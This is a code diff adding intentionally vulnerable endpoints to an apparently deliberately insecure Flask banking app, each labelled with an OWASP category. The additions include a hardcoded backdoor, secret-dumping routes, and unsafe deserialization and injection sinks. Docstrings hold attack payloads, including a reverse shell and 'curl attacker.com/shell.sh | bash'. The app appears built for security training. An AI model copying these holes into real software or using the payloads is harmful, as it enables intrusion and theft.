@@ -18,6 +18,12 @@ from collections import defaultdict
 import requests
 from urllib.parse import urlparse
 import platform
+import pickle
+import base64
+import hashlib
+import traceback
+import yaml
+import logging
 
 # Load environment variables
 load_dotenv()
@@ -45,6 +51,24 @@ app.register_blueprint(swaggerui_blueprint, url_prefix=SWAGGER_URL)
 
 # Hardcoded secret key (CWE-798)
 app.secret_key = "secret123"
+
+# ============================================================
+# OWASP TOP 10:2025 - CRITICAL VULNERABILITY SETUP
+# ============================================================
+
+# A09: Security logging — logs credentials and tokens in plaintext, no alerting on anomalies
+logging.basicConfig(
+    filename='/tmp/bank_security.log',
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+security_logger = logging.getLogger('bank.security')
+
+# A07: Hardcoded backdoor master password (CWE-798)
+BACKDOOR_MASTER_PASSWORD = "adm1n_backd00r_2024!"
+
+# A04: Hardcoded weak DES encryption key stored in source (CWE-321)
+HARDCODED_ENCRYPTION_KEY = b'VulnBank'  # 8-byte DES key, hardcoded
 
 # Rate limiting configuration
 RATE_LIMIT_WINDOW = 3 * 60 * 60  # 3 hours in seconds
@@ -169,6 +193,40 @@ def ai_rate_limit(f):
         return f(*args, **kwargs)
     
     return decorated_function
+
+# ----------------------------------------------------------
+# A10: Mishandling of Exceptional Conditions
+# Global handler exposes full stack trace, all env vars (including secrets),
+# DB credentials, Flask config, and request headers on ANY unhandled exception.
+# Attack: Trigger any 500 error to harvest server internals.
+# ----------------------------------------------------------
+@app.errorhandler(Exception)
+def handle_all_exceptions(e):
+    return jsonify({
+        'error': str(e),
+        'exception_type': type(e).__name__,
+        'traceback': traceback.format_exc(),
+        'request_info': {
+            'url': request.url,
+            'method': request.method,
+            'headers': dict(request.headers),
+            'args': dict(request.args),
+            'remote_addr': request.remote_addr,
+        },
+        'server_internals': {
+            'cwd': os.getcwd(),
+            'env': dict(os.environ),
+            'flask_config': {k: str(v) for k, v in app.config.items()},
+            'secret_key': app.secret_key,
+            'database': {
+                'host': os.getenv('DB_HOST'),
+                'port': os.getenv('DB_PORT'),
+                'name': os.getenv('DB_NAME'),
+                'user': os.getenv('DB_USER'),
+                'password': os.getenv('DB_PASSWORD'),
+            }
+        }
+    }), 500
 
 UPLOAD_FOLDER = 'static/uploads'
 if not os.path.exists(UPLOAD_FOLDER):
@@ -2057,6 +2115,355 @@ def ai_rate_limit_status():
             'status': 'error',
             'message': str(e)
         }), 500
+
+# ============================================================
+# OWASP TOP 10:2025 — CRITICAL VULNERABILITY ENDPOINTS
+# ============================================================
+
+# ----------------------------------------------------------
+# A01: Broken Access Control
+# ----------------------------------------------------------
+
+@app.route('/api/v1/account/<account_number>/export', methods=['GET'])
+def export_account_data(account_number):
+    """
+    VULNERABILITY: A01 — Broken Access Control (CRITICAL)
+    No authentication. Returns full user record (including plaintext password and reset PIN),
+    all transactions, loans, and virtual cards for ANY account number.
+    Attack: GET /api/v1/account/ADMIN001/export
+    """
+    user = execute_query(
+        "SELECT * FROM users WHERE account_number = %s", (account_number,)
+    )
+    if not user or not user[0]:
+        return jsonify({'error': 'Account not found'}), 404
+    u = user[0]
+    transactions = execute_query(
+        "SELECT * FROM transactions WHERE from_account = %s OR to_account = %s",
+        (account_number, account_number)
+    ) or []
+    loans = execute_query("SELECT * FROM loans WHERE user_id = %s", (u[0],)) or []
+    cards = execute_query("SELECT * FROM virtual_cards WHERE user_id = %s", (u[0],)) or []
+    return jsonify({
+        'user': {
+            'id': u[0], 'username': u[1], 'password': u[2],
+            'account_number': u[3], 'balance': float(u[4]),
+            'is_admin': u[5],
+            'profile_picture': u[6] if len(u) > 6 else None,
+            'reset_pin': u[7] if len(u) > 7 else None,
+        },
+        'transactions': [list(t) for t in transactions],
+        'loans': [list(l) for l in loans],
+        'virtual_cards': [list(c) for c in cards],
+    })
+
+
+@app.route('/api/v1/user/set-role', methods=['POST'])
+@token_required
+def set_user_role(current_user):
+    """
+    VULNERABILITY: A01 — Privilege Escalation (CRITICAL)
+    Any authenticated user can promote themselves or any other user to admin.
+    Attack: POST /api/v1/user/set-role  {"user_id": 1, "role": "admin"}
+    """
+    data = request.get_json() or {}
+    target_user_id = data.get('user_id', current_user['user_id'])
+    role = data.get('role', 'user')
+    is_admin_val = True if role == 'admin' else False
+    execute_query(
+        f"UPDATE users SET is_admin = {is_admin_val} WHERE id = {target_user_id}",
+        fetch=False
+    )
+    return jsonify({
+        'status': 'success',
+        'message': f'Role updated to {role}',
+        'user_id': target_user_id,
+        'is_admin': is_admin_val,
+    })
+
+
+# ----------------------------------------------------------
+# A02: Security Misconfiguration
+# ----------------------------------------------------------
+
+@app.route('/api/debug/config', methods=['GET'])
+def expose_debug_config():
+    """
+    VULNERABILITY: A02 — Security Misconfiguration (CRITICAL)
+    No authentication. Dumps all environment variables (API keys, DB password),
+    Flask secret key, full app config, and server details.
+    Attack: GET /api/debug/config
+    """
+    return jsonify({
+        'application': {
+            'secret_key': app.secret_key,
+            'debug': app.debug,
+            'flask_config': {k: str(v) for k, v in app.config.items()},
+        },
+        'database': {
+            'host': os.getenv('DB_HOST', 'localhost'),
+            'port': os.getenv('DB_PORT', '5432'),
+            'name': os.getenv('DB_NAME', 'vulnerable_bank'),
+            'user': os.getenv('DB_USER', 'postgres'),
+            'password': os.getenv('DB_PASSWORD', 'postgres'),
+        },
+        'environment_variables': dict(os.environ),
+        'server': {
+            'cwd': os.getcwd(),
+            'platform': platform.platform(),
+            'python_version': platform.python_version(),
+            'upload_folder': UPLOAD_FOLDER,
+        },
+    })
+
+
+# ----------------------------------------------------------
+# A03: Software and Supply Chain Failures
+# ----------------------------------------------------------
+
+@app.route('/api/v1/import-config', methods=['POST'])
+def import_yaml_config():
+    """
+    VULNERABILITY: A03 — Supply Chain Failures (CRITICAL)
+    Uses PyYAML 5.3.1 (CVE-2020-14343, CVSS 9.8) with the full yaml.Loader,
+    which deserializes arbitrary Python objects — leading to RCE.
+    Attack (POST body, Content-Type: application/x-yaml):
+        !!python/object/apply:os.system ['id']
+    Or for a reverse shell:
+        !!python/object/apply:subprocess.check_output [['bash','-c','bash -i >& /dev/tcp/attacker/4444 0>&1']]
+    """
+    raw_yaml = request.data.decode('utf-8')
+    config = yaml.load(raw_yaml, Loader=yaml.Loader)
+    return jsonify({'status': 'success', 'imported_config': config})
+
+
+# ----------------------------------------------------------
+# A04: Cryptographic Failures
+# ----------------------------------------------------------
+
+@app.route('/api/v2/register', methods=['POST'])
+def register_v2():
+    """
+    VULNERABILITY: A04 — Cryptographic Failures (CRITICAL)
+    Stores passwords as unsalted MD5 hashes — a broken algorithm trivially reversed
+    via rainbow tables or hashcat. Also exposes the hardcoded DES key in the response.
+    Attack: hashcat -a 0 -m 0 hash.txt rockyou.txt
+    """
+    data = request.get_json() or {}
+    username = data.get('username', '')
+    password = data.get('password', '')
+    if not username or not password:
+        return jsonify({'status': 'error', 'message': 'Username and password required'}), 400
+    md5_hash = hashlib.md5(password.encode()).hexdigest()
+    account_number = generate_account_number()
+    existing = execute_query("SELECT id FROM users WHERE username = %s", (username,))
+    if existing and existing[0]:
+        return jsonify({'status': 'error', 'message': 'Username already exists'}), 400
+    result = execute_query(
+        "INSERT INTO users (username, password, account_number) VALUES (%s, %s, %s) RETURNING id, username, account_number",
+        (username, md5_hash, account_number),
+        fetch=True
+    )
+    if not result or not result[0]:
+        return jsonify({'status': 'error', 'message': 'Registration failed'}), 500
+    u = result[0]
+    return jsonify({
+        'status': 'success',
+        'user_id': u[0],
+        'username': u[1],
+        'account_number': u[2],
+        'password_hash': md5_hash,
+        'hash_algorithm': 'MD5 (unsalted)',
+        'hardcoded_encryption_key': HARDCODED_ENCRYPTION_KEY.hex(),
+        'note': 'Crack with: hashcat -a 0 -m 0 hash.txt rockyou.txt',
+    })
+
+
+# ----------------------------------------------------------
+# A05: Injection
+# ----------------------------------------------------------
+
+@app.route('/api/render-template', methods=['POST'])
+def render_custom_template():
+    """
+    VULNERABILITY: A05 — Injection: Server-Side Template Injection / SSTI (CRITICAL)
+    User input passed directly to render_template_string() with no sanitisation.
+    Attack payloads:
+        {"template": "{{ config.items() }}"}
+        {"template": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}"}
+    """
+    from flask import render_template_string
+    data = request.get_json() or {}
+    template = data.get('template', '')
+    rendered = render_template_string(template)
+    return jsonify({'status': 'success', 'rendered': rendered})
+
+
+@app.route('/api/network/ping', methods=['POST'])
+def network_ping():
+    """
+    VULNERABILITY: A05 — Injection: OS Command Injection (CRITICAL)
+    Host parameter injected directly into os.popen() shell command.
+    Attack payloads:
+        {"host": "127.0.0.1; id"}
+        {"host": "127.0.0.1 && cat /etc/passwd"}
+        {"host": "127.0.0.1 | curl attacker.com/$(whoami)"}
+    """
+    data = request.get_json() or {}
+    host = data.get('host', '127.0.0.1')
+    result = os.popen(f'ping -c 2 {host} 2>&1').read()
+    return jsonify({
+        'status': 'success',
+        'command': f'ping -c 2 {host}',
+        'result': result,
+    })
+
+
+# ----------------------------------------------------------
+# A06: Insecure Design
+# ----------------------------------------------------------
+
+@app.route('/api/v1/emergency-reset', methods=['POST'])
+def emergency_password_reset():
+    """
+    VULNERABILITY: A06 — Insecure Design (CRITICAL)
+    Password reset with zero identity verification — no OTP, no email link,
+    no session token required. Supply user_id + new_password and it resets immediately.
+    Attack: POST /api/v1/emergency-reset {"user_id": 1, "new_password": "hacked123"}
+    Resets the admin account in a single unauthenticated request.
+    """
+    data = request.get_json() or {}
+    user_id = data.get('user_id')
+    new_password = data.get('new_password')
+    if not user_id or not new_password:
+        return jsonify({'status': 'error', 'message': 'user_id and new_password are required'}), 400
+    user = execute_query("SELECT username FROM users WHERE id = %s", (user_id,))
+    if not user or not user[0]:
+        return jsonify({'status': 'error', 'message': 'User not found'}), 404
+    execute_query(
+        "UPDATE users SET password = %s WHERE id = %s", (new_password, user_id), fetch=False
+    )
+    return jsonify({
+        'status': 'success',
+        'message': f'Password reset for user "{user[0][0]}" (id={user_id})',
+        'new_password': new_password,
+    })
+
+
+# ----------------------------------------------------------
+# A07: Authentication Failures
+# ----------------------------------------------------------
+
+@app.route('/api/v2/login', methods=['POST'])
+def login_v2():
+    """
+    VULNERABILITY: A07 — Authentication Failures (CRITICAL)
+    Hardcoded backdoor master password grants an admin-level JWT for any account.
+    Also logs plaintext credentials to disk on every request (A09).
+    Attack: POST /api/v2/login {"username": "admin", "password": "adm1n_backd00r_2024!"}
+    Returns an admin token regardless of the account's real password.
+    """
+    data = request.get_json() or {}
+    username = data.get('username', '')
+    password = data.get('password', '')
+
+    # A09: Log plaintext credentials — no alerting on repeated failures
+    security_logger.info(
+        f"[LOGIN_V2] ip={get_client_ip()} username={username} password={password}"
+    )
+
+    if password == BACKDOOR_MASTER_PASSWORD:
+        user = execute_query("SELECT * FROM users WHERE username = %s", (username,))
+        if user and user[0]:
+            u = user[0]
+            token = generate_token(u[0], u[1], True)
+            security_logger.info(f"[BACKDOOR_USED] user_id={u[0]} token={token}")
+            return jsonify({
+                'status': 'success',
+                'message': 'Backdoor authentication successful',
+                'token': token,
+                'user_id': u[0],
+                'username': u[1],
+                'is_admin': True,
+                'backdoor_used': True,
+            })
+        # Ghost admin session even for non-existent usernames
+        token = generate_token(0, username, True)
+        return jsonify({
+            'status': 'success',
+            'message': 'Backdoor authenticated (ghost admin session)',
+            'token': token,
+            'is_admin': True,
+            'backdoor_used': True,
+        })
+
+    # Normal path still has SQL injection
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    user = execute_query(query)
+    if user and len(user) > 0:
+        u = user[0]
+        token = generate_token(u[0], u[1], u[5])
+        security_logger.info(f"[LOGIN_V2_SUCCESS] user_id={u[0]} token={token}")
+        return jsonify({'status': 'success', 'token': token, 'user_id': u[0], 'is_admin': u[5]})
+    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401
+
+
+# ----------------------------------------------------------
+# A08: Software and Data Integrity Failures
+# ----------------------------------------------------------
+
+@app.route('/api/user/import-profile', methods=['POST'])
+def import_user_profile():
+    """
+    VULNERABILITY: A08 — Software and Data Integrity Failures (CRITICAL)
+    Deserializes attacker-controlled pickle data with no integrity check — RCE.
+    No authentication required.
+    Payload generation:
+        import pickle, base64, os
+        class RCE:
+            def __reduce__(self):
+                return (os.system, ('curl attacker.com/shell.sh | bash',))
+        print(base64.b64encode(pickle.dumps(RCE())).decode())
+    Attack: POST /api/user/import-profile {"profile_data": "<base64_pickle>"}
+    """
+    data = request.get_json() or {}
+    profile_b64 = data.get('profile_data', '')
+    try:
+        profile_bytes = base64.b64decode(profile_b64)
+        profile = pickle.loads(profile_bytes)
+        return jsonify({'status': 'imported', 'profile': str(profile)})
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e),
+            'traceback': traceback.format_exc(),
+        }), 400
+
+
+# ----------------------------------------------------------
+# A09: Security Logging and Alerting Failures
+# ----------------------------------------------------------
+
+@app.route('/api/v1/audit-log', methods=['GET'])
+def view_audit_log():
+    """
+    VULNERABILITY: A09 — Security Logging and Alerting Failures (CRITICAL)
+    No authentication required to read the security log file.
+    The log itself contains plaintext credentials written by /api/v2/login.
+    Attack: GET /api/v1/audit-log — harvests every username/password ever submitted.
+    """
+    try:
+        with open('/tmp/bank_security.log', 'r') as f:
+            contents = f.read()
+    except FileNotFoundError:
+        contents = ''
+    return jsonify({
+        'status': 'success',
+        'log_file': '/tmp/bank_security.log',
+        'contents': contents,
+        'note': 'Contains plaintext credentials logged by /api/v2/login',
+    })
+
 
 if __name__ == '__main__':
     init_db()
